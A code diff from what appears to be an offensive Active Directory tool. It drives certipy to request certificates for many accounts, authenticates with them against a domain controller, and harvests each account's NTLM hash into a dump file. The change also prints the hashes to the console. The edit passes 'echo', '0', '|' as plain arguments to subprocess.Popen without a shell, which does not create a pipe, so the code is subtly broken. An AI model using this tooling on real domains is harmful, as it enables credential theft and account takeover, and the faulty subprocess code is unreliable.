@@ -122,8 +122,8 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
     logger.info(f"🔄 Retrieving certificates for {len(accounts.accounts)} accounts...")
 
     def fetch_cert_and_auth(account):
-        upn = f"'{account.spn}'"
-        sid = f"'{account.sid}'"
+        upn = f'{account.spn}'
+        sid = account.sid
         if proxychains:
             command = [
                 'proxychains4', certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
@@ -149,9 +149,9 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
         if not account.pfx_filepath.endswith('.pfx'):
             return None
         if proxychains:
-            command = ['proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
+            command = ['echo', '0', '|', 'proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
         else:
-            command = [certipy_client, 'auth', '-pfx', account.pfx_filepath,  '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
+            command = ['echo', '0', '|', certipy_client, 'auth', '-pfx', account.pfx_filepath,  '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
         auth_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         stdout, stderr = auth_process.communicate()
 
@@ -176,7 +176,7 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
                         try:
                             ntlm_hash = stdout.split('\n')[-1].split(': ')[1]
                             out_file.write(f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n')
-                            logger.success(f"🔑 Successfully authenticated {account.username} - NTLM Hash stored")
+                            print((f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n'))
                         except IndexError:
                             logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {stdout}")
 
